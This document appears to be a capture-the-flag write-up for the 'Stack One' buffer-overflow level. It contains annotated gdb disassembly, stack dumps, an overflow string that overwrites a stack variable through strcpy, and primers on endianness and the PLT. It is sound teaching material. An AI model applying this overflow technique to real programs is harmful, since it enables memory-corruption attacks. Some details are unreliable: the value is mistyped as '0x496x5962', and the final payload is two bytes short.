<h3 style="text-align:center" dir="rtl">بسم الله الرحمن الرحيم </h3>

# Stack One
This challenge is same as stack zero but with one modification. We need to overflow the buffer to write a specific value to `changeme` which is `0x496c5962`. `0x496c5962` is the ascii representation of "IlYb".
- Compile the source code and run gdb
```bash
gcc -g stack-one.c -o stack-one
gdb stack-one
```
- disassemble main
```bash
(gdb)disassemble main
Dump of assembler code for function main:
   0x00005555555551c9 <+0>:     endbr64 
   0x00005555555551cd <+4>:     push   rbp
   0x00005555555551ce <+5>:     mov    rbp,rsp
   0x00005555555551d1 <+8>:     sub    rsp,0x60
   0x00005555555551d5 <+12>:    mov    DWORD PTR [rbp-0x54],edi ; argc
   0x00005555555551d8 <+15>:    mov    QWORD PTR [rbp-0x60],rsi ;argv
   0x00005555555551dc <+19>:    mov    rax,QWORD PTR fs:0x28 
   0x00005555555551e5 <+28>:    mov    QWORD PTR [rbp-0x8],rax
   0x00005555555551e9 <+32>:    xor    eax,eax
   0x00005555555551eb <+34>:    lea    rax,[rip+0xe16] ; address of BANNER       # 0x555555556008
   0x00005555555551f2 <+41>:    mov    rdi,rax
   0x00005555555551f5 <+44>:    call   0x5555555550a0 <puts@plt> ; print welcome message
   0x00005555555551fa <+49>:    cmp    DWORD PTR [rbp-0x54],0x1 ; check if argc = 1
   0x00005555555551fe <+53>:    jg     0x555555555219 <main+80> ; jump if argc > 1
   0x0000555555555200 <+55>:    lea    rax,[rip+0xe49]  ; Load error message      # 0x555555556050
   0x0000555555555207 <+62>:    mov    rsi,rax ; copy error message to rsi
   0x000055555555520a <+65>:    mov    edi,0x1
   0x000055555555520f <+70>:    mov    eax,0x0
   0x0000555555555214 <+75>:    call   0x5555555550b0 <errx@plt> ; call error function and terminat the program
   0x0000555555555219 <+80>:    mov    DWORD PTR [rbp-0x10],0x0 ; changesme = 0
   0x0000555555555220 <+87>:    mov    rax,QWORD PTR [rbp-0x60] ; load argv to rax
   0x0000555555555224 <+91>:    add    rax,0x8
   0x0000555555555228 <+95>:    mov    rdx,QWORD PTR [rax] : move rax to rdx
   0x000055555555522b <+98>:    lea    rax,[rbp-0x50] ; load buffer to rax
   0x000055555555522f <+102>:   mov    rsi,rdx
   0x0000555555555232 <+105>:   mov    rdi,rax
   0x0000555555555235 <+108>:   call   0x555555555090 <strcpy@plt>
   0x000055555555523a <+113>:   mov    eax,DWORD PTR [rbp-0x10] ;load changeme to eax
   0x000055555555523d <+116>:   cmp    eax,0x496c5962 ; compare changeme with 0x496x5962
   0x0000555555555242 <+121>:   jne    0x555555555255 <main+140> ; jump if changme != 0x496x5962 
   0x0000555555555244 <+123>:   lea    rax,[rip+0xe3d]  ; load address of success string       # 0x555555556088
   0x000055555555524b <+130>:   mov    rdi,rax
   0x000055555555524e <+133>:   call   0x5555555550a0 <puts@plt> ; print success string
   0x0000555555555253 <+138>:   jmp    0x55555555526e <main+165> ; jump to end
   0x0000555555555255 <+140>:   mov    eax,DWORD PTR [rbp-0x10] ; mov value of changeme
   0x0000555555555258 <+143>:   mov    esi,eax
   0x000055555555525a <+145>:   lea    rax,[rip+0xe6f]    ; load address of unsuccess string    # 0x5555555560d0
   0x0000555555555261 <+152>:   mov    rdi,rax
   0x0000555555555264 <+155>:   mov    eax,0x0
   0x0000555555555269 <+160>:   call   0x5555555550c0 <printf@plt> 
   0x000055555555526e <+165>:   mov    edi,0x0
   0x0000555555555273 <+170>:   call   0x5555555550d0 <exit@plt>
```
- We need to overflow the buffer to overwrite changeme to `0x496x5962`.Set a break point after strcpy call.
```bash
(gdb)break *0x000055555555523a
(gdb)run AAAABBBBCCCCDDDDEEEE
```
- Examine the stack
```bash
(gdb) x/20wx ($rbp - 0x50)
0x7fffffffd750: 0x41414141      0x42424242      0x43434343      0x44444444
0x7fffffffd760: 0x45454545      0x00007f00      0x01000000      0x00000101
0x7fffffffd770: 0x00000002      0x00000000      0xbfebfbff      0x00000000
0x7fffffffd780: 0xffffdd09      0x00007fff      0x00000064      0x00000000
0x7fffffffd790: 0x00000000      0x00000000      0x652ab000      0x0a4e119f
```
- The string is copied to `buffer`. Now we need to overflow to `changeme` and write the string `IlYb` in it.
```bash
(gdb) run AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPIlYb
(gdb) x/20wx ($rbp - 0x50)
0x7fffffffd720: 0x41414141      0x42424242      0x43434343      0x44444444
0x7fffffffd730: 0x45454545      0x46464646      0x47474747      0x48484848
0x7fffffffd740: 0x49494949      0x4a4a4a4a      0x4b4b4b4b      0x4c4c4c4c
0x7fffffffd750: 0x4d4d4d4d      0x4e4e4e4e      0x4f4f4f4f      0x50505050
0x7fffffffd760: 0x62596c49      0x00000000      0xeef20300      0x348bc308
```
- `changeme` data is in the address  0x7fffffffd760 to 0x7fffffffd763 but we see `IlYb` is reversed because of little endian byte ordering(Detailed explaination at the end) so we need to reverse the string to `bYlI` to pass the if statment.
```bash
(gdb)run AABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPbYlI
```

## Explain Things I Encounter in The Level
### Size Perfixes Used With Memory Operands in Intel Assembly:
- `BYTE PTR`: indicates an 8-bit value
- `WORD PTR`: indicates a 16-bit value
- `DWORD PTR`: indicates a 32-bit value
- `QWORD PTR`: indicates a 64-bit value
- `XMMWORD PTR`: indicates a 128-bit value (used with the SSE2 instruction set).
<br/>
The size prefix is used to specify the size of the memory operand being accessed, and it must match the size of the destination register or the size of the data being moved.

### Meaning of [] in `mov` or `lea` instruction:
In Intel assembly language, the brackets around a register or memory operand indicate that the value is being used as an address. When an instruction uses a memory operand in this way, it indicates that the instruction is accessing the value stored at the memory location pointed to by the address.For example, the following c code.
```c
int x = 10;
// mov     DWORD PTR [rbp-16], 10 ; mov 10 to memory address rbp-12
int* ptr = &x;
//lea     rax, [rbp-16] ; load memory address to register rax
//mov     QWORD PTR [rbp-8], rax ; move the stored memory address in rax to memory address rbp-8
int c = *ptr;
//mov     rax, QWORD PTR [rbp-8] ; mov the address of x (ptr is pointing to)
//mov     eax, DWORD PTR [rax] ; store the value at address [rax] 
// [rax] is assem = x in c, rax in assem = &x in c 
//mov     DWORD PTR [rbp-12], eax ; store the value at eax - which is 10 - to memory address rbp - 12
```
### Little Endian vs Big Endian:
Little endian and big endian are terms used to describe the order in which bytes are stored in memory.Little endian refers to system in which the least significant byte (LSB) is stored at the lowest memory address, and the most significant byte (MSB) is stored at the highest memeory address. <br/>
For example, consider the following 32-bit integer value stored in memory:
```
0x12345678
78 is the LSB
12 is the MSB
```
In a little endian system, this value would be stored in memory as follows:
```
Address  Value
-------  -----
0x1000   0x78
0x1001   0x56
0x1002   0x34
0x1003   0x12
```
In a big endian system, this value would be stored in memory as follows:
```
Address  Value
-------  -----
0x1000   0x12
0x1001   0x34
0x1002   0x56
0x1003   0x78
```
The MSB stored at the lowest memory address, and the LSB stored at  highest memory address.<br/>
Little endian is used on some computer architectures, such as x86, as the default byte order for storing multi-byte values in memory. It is also used by some network protocols for storing multi-byte values in packets.
<br/>
It is importent to consider the endianness of a system when working with mutli-byte values, as the order in which the bytes are stored can affect the way the values are interpreted.For example, a value that is stored in memory as 0x12345678 on a little endian system may be interpreted as 0x78563412 on a big endian system.
### What is the `@plt` Suffix After Function Name in `call` instruction ?
The @plt suffix indicates that the function is being called through the Procedure Linkage Table (PLT).
<br/>
The Procedure Linkage Table (PLT) is a mechanism used in programs compiled for ELF (Executable and Linking Format) platforms, such as Linux, to provide a level of indirection when calling external functions.
<br/>
Here's a summary of how the PLT works:

1. When a program is compiled, the `linker` generates a PLT for each external function that is called in the program. The PLT consists of a series of entries, each of which corresponds to a specific external function.

2. When the program is loaded into memory, the PLT entries are initialized to point to a small piece of code called the "PLT stub."

3. When the program needs to call an external function, it will call the corresponding entry in the PLT instead of calling the function directly. This will transfer control to the PLT stub for the function.

4. The PLT stub will look up the actual address of the function and jump to it. This allows the program to execute without needing to know the addresses of the external functions it calls until they are actually needed.

